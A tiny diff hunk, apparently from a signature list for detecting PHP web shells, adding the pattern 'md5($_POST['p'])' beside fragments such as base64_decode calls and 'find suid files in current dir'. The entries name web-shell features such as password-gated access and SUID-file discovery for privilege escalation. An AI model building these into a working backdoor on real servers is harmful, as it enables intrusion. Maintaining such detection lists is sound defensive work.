@@ -8,3 +8,4 @@ MailTo = base64_decode
 find suid files in current dir
 column_title('permission',
 base64_decode('Ly
+md5($_POST['p'])
